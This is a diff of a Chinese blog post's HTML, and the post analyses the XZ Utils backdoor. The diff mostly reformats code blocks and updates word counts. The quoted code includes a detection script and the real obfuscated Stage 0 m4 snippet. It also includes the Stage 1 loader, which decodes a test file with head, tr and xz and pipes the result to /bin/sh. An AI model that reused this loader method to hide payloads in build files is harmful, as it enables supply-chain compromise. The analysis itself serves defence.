@@ -10,7 +10,7 @@
 <meta name="description" content="Xavier&#39;s Blog" /><meta name="keywords" content='漏洞分析' /><meta itemprop="name" content="XZ Utils Backdoor 事件分析汇总">
 <meta itemprop="description" content=""><meta itemprop="datePublished" content="2024-04-06T17:05:44+00:00" />
 <meta itemprop="dateModified" content="2024-04-06T17:05:44+00:00" />
-<meta itemprop="wordCount" content="10197">
+<meta itemprop="wordCount" content="10551">
 <meta itemprop="keywords" content="漏洞分析," /><meta property="og:title" content="XZ Utils Backdoor 事件分析汇总" />
 <meta property="og:description" content="" />
 <meta property="og:type" content="article" />
@@ -32,7 +32,7 @@
     "mainEntityOfPage": {
       "@type": "WebPage",
       "@id": "https:\/\/www.bthoughts.top\/posts\/xz-backdoor-analysis\/"
-    },"genre": "posts","keywords": "漏洞分析","wordcount":  10197 ,
+    },"genre": "posts","keywords": "漏洞分析","wordcount":  10551 ,
     "url": "https:\/\/www.bthoughts.top\/posts\/xz-backdoor-analysis\/","datePublished": "2024-04-06T17:05:44+00:00","dateModified": "2024-04-06T17:05:44+00:00","publisher": {
       "@type": "Organization",
       "name": ""},"author": {
@@ -189,7 +189,7 @@
       </h1></div><div class="post-meta">
       <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="/resource/friends/me.jpeg" srcset="/resource/friends/me.jpeg, /resource/friends/me.jpeg 1.5x, /resource/friends/me.jpeg 2x" sizes="auto" data-title="Xavier" data-alt="Xavier" class="avatar" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/>&nbsp;Xavier</span></span>
           <span class="post-category">收录于 <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 漏洞分析</a>&ensp;<a href="/categories/%E8%81%8C%E4%B8%9A%E7%94%9F%E6%B6%AF/"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 职业生涯</a></span></div>
-      <div class="post-meta-line"><span title=2024-04-06&#32;17:05:44><i class="fa-regular fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2024-04-06">2024-04-06</time></span>&nbsp;<span><i class="fa-solid fa-pencil-alt fa-fw" aria-hidden="true"></i> 约 10197 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw" aria-hidden="true"></i> 预计阅读 21 分钟</span>&nbsp;</div>
+      <div class="post-meta-line"><span title=2024-04-06&#32;17:05:44><i class="fa-regular fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2024-04-06">2024-04-06</time></span>&nbsp;<span><i class="fa-solid fa-pencil-alt fa-fw" aria-hidden="true"></i> 约 10551 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw" aria-hidden="true"></i> 预计阅读 22 分钟</span>&nbsp;</div>
     </div><div class="details toc" id="toc-static" data-kept="false">
         <div class="details-summary toc-title">
           <span>目录</span>
@@ -211,7 +211,13 @@
       <ul>
         <li><a href="#stage-0">Stage 0</a></li>
         <li><a href="#stage-1">Stage 1</a></li>
-        <li><a href="#stage-2">Stage 2</a></li>
+        <li><a href="#stage-2">Stage 2</a>
+          <ul>
+            <li><a href="#扩展-机制">扩展 机制</a></li>
+            <li><a href="#目标选择">目标选择</a></li>
+            <li><a href="#后门提取">后门提取</a></li>
+          </ul>
+        </li>
         <li><a href="#o二进制分析">.o二进制分析</a></li>
         <li><a href="#后门设计分析">后门设计分析</a></li>
         <li><a href="#payload-分析">payload 分析</a></li>
@@ -295,12 +301,43 @@
 <p>非 x64 (amd64) 架构的系统不受影响。</p>
 <h3 id="漏洞排查">漏洞排查</h3>
 <p>通过如下命令查看系统本地是否安装了受影响的 XZ：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">$ xz --version
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">$ xz --version
 </span></span><span class="line"><span class="cl">xz <span class="o">(</span>XZ Utils<span class="o">)</span> 5.6.1
 </span></span><span class="line"><span class="cl">liblzma 5.6.1
-</span></span></code></pre></div><p>自查脚本如下：</p>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>自查脚本如下：</p>
 <p>在系统中执行脚本</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="cp">#! /bin/bash
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="cp">#! /bin/bash
 </span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="nb">set</span> -eu
 </span></span><span class="line"><span class="cl"><span class="c1"># find path to liblzma used by sshd</span>
 </span></span><span class="line"><span class="cl"><span class="nv">path</span><span class="o">=</span><span class="s2">&#34;</span><span class="k">$(</span>ldd <span class="k">$(</span>which sshd<span class="k">)</span> <span class="p">|</span> grep liblzma <span class="p">|</span> grep -o <span class="s1">&#39;/[^ ]*&#39;</span><span class="k">)</span><span class="s2">&#34;</span>
@@ -318,7 +355,9 @@
 </span></span><span class="line"><span class="cl"><span class="k">else</span>
 </span></span><span class="line"><span class="cl"><span class="nb">echo</span> probably not vulnerable
 </span></span><span class="line"><span class="cl"><span class="k">fi</span>
-</span></span></code></pre></div><h3 id="缓解措施">缓解措施</h3>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="缓解措施">缓解措施</h3>
 <p>目前官方尚无最新版本， 需对软件版本进行降级 5.4.X， 请关注官方新版本发布并及时更新。</p>
 <p>Fedora Linux 40 用户需 xz 回退到 5.4.x 版本可参考：</p>
 <p><a href="https://www.redhat.com/en/blog/urgent-security-alert-fedora-41-and-rawhide-users"target="_blank" rel="external nofollow noopener noreferrer">https://www.redhat.com/en/blog/urgent-security-alert-fedora-41-and-rawhide-users</a></p>
@@ -372,12 +411,23 @@
 <p>目前 GitHub 已经关停了整个 xz项目，但可以从 <a href="https://github.com/thesamesam/xz-archive"target="_blank" rel="external nofollow noopener noreferrer">备份仓库</a> 进行下载分析。</p>
 <h3 id="stage-0">Stage 0</h3>
 <p>从<a href="https://salsa.debian.org/debian/xz-utils/-/blob/46cb28adbbfb8f50a10704c1b86f107d077878e6/m4/build-to-host.m4"target="_blank" rel="external nofollow noopener noreferrer">m4/build-to-host.m4</a>文件开始。以下是相关代码片段：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">...
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">...
 </span></span><span class="line"><span class="cl">gl_<span class="o">[</span><span class="nv">$1</span><span class="o">]</span><span class="nv">_config</span><span class="o">=</span><span class="s1">&#39;sed \&#34;r\n\&#34; $gl_am_configmake | eval $gl_path_map | $gl_[$1]_prefix -d 2&gt;/dev/null&#39;</span>
 </span></span><span class="line"><span class="cl">...
 </span></span><span class="line"><span class="cl"><span class="nv">gl_path_map</span><span class="o">=</span><span class="s1">&#39;tr &#34;\t \-_&#34; &#34; \t_\-&#34;&#39;</span>
 </span></span><span class="line"><span class="cl">...
-</span></span></code></pre></div><p><img loading="lazy" src="resource/xz%e5%ba%93%e6%81%b6%e6%84%8f%e5%90%8e%e9%97%a8%e6%a4%8d%e5%85%a5%e4%ba%8b%e4%bb%b6.assets/image-20240406005935000.png" srcset="/posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/image-20240406005935000.png, resource/xz%e5%ba%93%e6%81%b6%e6%84%8f%e5%90%8e%e9%97%a8%e6%a4%8d%e5%85%a5%e4%ba%8b%e4%bb%b6.assets/image-20240406005935000.png 1.5x, /posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/image-20240406005935000.png 2x" sizes="auto" data-title="image-20240406005935000" data-alt="image-20240406005935000" width="1169" height="1093" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="resource/xz%e5%ba%93%e6%81%b6%e6%84%8f%e5%90%8e%e9%97%a8%e6%a4%8d%e5%85%a5%e4%ba%8b%e4%bb%b6.assets/image-20240406005935000.png" srcset="/posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/image-20240406005935000.png, resource/xz%e5%ba%93%e6%81%b6%e6%84%8f%e5%90%8e%e9%97%a8%e6%a4%8d%e5%85%a5%e4%ba%8b%e4%bb%b6.assets/image-20240406005935000.png 1.5x, /posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/image-20240406005935000.png 2x" sizes="auto" data-title="image-20240406005935000" data-alt="image-20240406005935000" width="1169" height="1093" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 <p>进行了一个字符替换，将制表符<code>\t</code>、空格<code>\ </code>、连字符<code>-</code>、下划线<code>_</code>，依次替换为了空格<code>\ </code>、制表符<code>\t</code>、下划线<code>_</code>、连字符<code>-</code></p>
 <p>这段代码在构建过程中的某个地方运行，提取第一阶段脚本。概述如下：</p>
 <ol>
@@ -389,7 +439,25 @@
 <p><img loading="lazy" src="resource/xz%e5%ba%93%e6%81%b6%e6%84%8f%e5%90%8e%e9%97%a8%e6%a4%8d%e5%85%a5%e4%ba%8b%e4%bb%b6.assets/image-20240406211624801.png" srcset="/posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/image-20240406211624801.png, resource/xz%e5%ba%93%e6%81%b6%e6%84%8f%e5%90%8e%e9%97%a8%e6%a4%8d%e5%85%a5%e4%ba%8b%e4%bb%b6.assets/image-20240406211624801.png 1.5x, /posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/image-20240406211624801.png 2x" sizes="auto" data-title="image-20240406211624801" data-alt="image-20240406211624801" width="1900" height="672" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 <h3 id="stage-1">Stage 1</h3>
 <p>在Andres 的电子邮件中是以“####Hello####”开头的 bash 文件。以下是 5.6.1版本</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="c1">####Hello####</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="c1">####Hello####</span>
 </span></span><span class="line"><span class="cl"><span class="c1"># a few binary bytes here, but as it&#39;s a comment they are ignorred</span>
 </span></span><span class="line"><span class="cl"><span class="o">[</span> ! <span class="k">$(</span>uname<span class="k">)</span> <span class="o">=</span> <span class="s2">&#34;Linux&#34;</span> <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="nb">exit</span> <span class="m">0</span>
 </span></span><span class="line"><span class="cl"><span class="o">[</span> ! <span class="k">$(</span>uname<span class="k">)</span> <span class="o">=</span> <span class="s2">&#34;Linux&#34;</span> <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="nb">exit</span> <span class="m">0</span>
@@ -403,14 +471,25 @@
 </span></span><span class="line"><span class="cl"><span class="k">fi</span>
 </span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">i</span><span class="o">=</span><span class="s2">&#34;((head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +939)&#34;</span><span class="p">;</span><span class="o">(</span>xz -dc <span class="nv">$srcdir</span>/tests/files/good-large_compressed.lzma<span class="p">|</span><span class="nb">eval</span> <span class="nv">$i</span><span class="p">|</span>tail -c +31233<span class="p">|</span>tr <span class="s2">&#34;\114-\321\322-\377\35-\47\14-\34\0-\13\50-\113&#34;</span> <span class="s2">&#34;\0-\377&#34;</span><span class="o">)</span><span class="p">|</span>xz -F raw --lzma1 -dc<span class="p">|</span>/bin/sh
 </span></span><span class="line"><span class="cl"><span class="c1">####World####</span>
-</span></span></code></pre></div><p>可以看到5.6.0 和 5.6.1 的一些区别：</p>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以看到5.6.0 和 5.6.1 的一些区别：</p>
 <p>第一个区别是第二行注释中的随机字节。在5.6.0 是 86 F9 5A F7 2E 68 6A BC, 而在 5.6.1 是 E5 55 89 B7 24 04 D8 17. 暂时不确定这些差异是否有意义。</p>
 <p>第二个区别是5.6.1版本添加了检测是否在 Linux 上运行代码，而它重复了 5 次，这很奇怪。</p>
 <p>先分析第 2 阶段提取代码，即带有很多head的<code>export i=... </code>行。进行简单拆分：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">i</span><span class="o">=</span><span class="s2">&#34;((head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +939)&#34;</span><span class="p">;</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">i</span><span class="o">=</span><span class="s2">&#34;((head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +939)&#34;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="o">(</span>xz -dc <span class="nv">$srcdir</span>/tests/files/good-large_compressed.lzma<span class="p">|</span><span class="nb">eval</span> <span class="nv">$i</span><span class="p">|</span>tail -c +31233<span class="p">|</span>tr <span class="s2">&#34;\114-\321\322-\377\35-\47\14-\34\0-\13\50-\113&#34;</span> <span class="s2">&#34;\0-\377&#34;</span><span class="o">)</span><span class="p">|</span>xz -F raw --lzma1 -dc<span class="p">|</span>/bin/sh
-</span></span></code></pre></div><ol>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ol>
 <li>
 <p>开头的<code>export i=... </code> 只是一个函数定义。它会在Stage 2 和 Stage 3 中被调用。</p>
 </li>
@@ -425,16 +504,241 @@
 </li>
 <li>
 <p>第5步执行 tr 命令，用作简单的替换密码，密钥（字节值映射）在 5.6.0 和 5.6.1 中不同，两种情况下，都有 6 个范围映射到整个 0 - 255（即八进制 377）范围。</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">5.6.0: tr <span class="s2">&#34;\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131&#34;</span> <span class="s2">&#34;\0-\377&#34;</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">5.6.0: tr <span class="s2">&#34;\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131&#34;</span> <span class="s2">&#34;\0-\377&#34;</span>
 </span></span><span class="line"><span class="cl">5.6.1: tr <span class="s2">&#34;\114-\321\322-\377\35-\47\14-\34\0-\13\50-\113&#34;</span> <span class="s2">&#34;\0-\377&#34;</span>
-</span></span></code></pre></div></li>
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
 <li>
 <p>在最后一步中，解密的数据被解压缩（<code>xz -F raw --lzma1 -dc</code>），并且立即执行Stage 2。</p>
 </li>
 </ol>
 <p>5.6.0 解压结果部分：</p>
 <p><img loading="lazy" src="resource/xz%e5%ba%93%e6%81%b6%e6%84%8f%e5%90%8e%e9%97%a8%e6%a4%8d%e5%85%a5%e4%ba%8b%e4%bb%b6.assets/image-20240406212656571.png" srcset="/posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/image-20240406212656571.png, resource/xz%e5%ba%93%e6%81%b6%e6%84%8f%e5%90%8e%e9%97%a8%e6%a4%8d%e5%85%a5%e4%ba%8b%e4%bb%b6.assets/image-20240406212656571.png 1.5x, /posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/image-20240406212656571.png 2x" sizes="auto" data-title="image-20240406212656571" data-alt="image-20240406212656571" width="2212" height="1204" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="nv">P</span><span class="o">=</span><span class="s2">&#34;-fPIC -DPIC -fno-lto -ffunction-sections -fdata-sections&#34;</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span><span class="lnt">136
+</span><span class="lnt">137
+</span><span class="lnt">138
+</span><span class="lnt">139
+</span><span class="lnt">140
+</span><span class="lnt">141
+</span><span class="lnt">142
+</span><span class="lnt">143
+</span><span class="lnt">144
+</span><span class="lnt">145
+</span><span class="lnt">146
+</span><span class="lnt">147
+</span><span class="lnt">148
+</span><span class="lnt">149
+</span><span class="lnt">150
+</span><span class="lnt">151
+</span><span class="lnt">152
+</span><span class="lnt">153
+</span><span class="lnt">154
+</span><span class="lnt">155
+</span><span class="lnt">156
+</span><span class="lnt">157
+</span><span class="lnt">158
+</span><span class="lnt">159
+</span><span class="lnt">160
+</span><span class="lnt">161
+</span><span class="lnt">162
+</span><span class="lnt">163
+</span><span class="lnt">164
+</span><span class="lnt">165
+</span><span class="lnt">166
+</span><span class="lnt">167
+</span><span class="lnt">168
+</span><span class="lnt">169
+</span><span class="lnt">170
+</span><span class="lnt">171
+</span><span class="lnt">172
+</span><span class="lnt">173
+</span><span class="lnt">174
+</span><span class="lnt">175
+</span><span class="lnt">176
+</span><span class="lnt">177
+</span><span class="lnt">178
+</span><span class="lnt">179
+</span><span class="lnt">180
+</span><span class="lnt">181
+</span><span class="lnt">182
+</span><span class="lnt">183
+</span><span class="lnt">184
+</span><span class="lnt">185
+</span><span class="lnt">186
+</span><span class="lnt">187
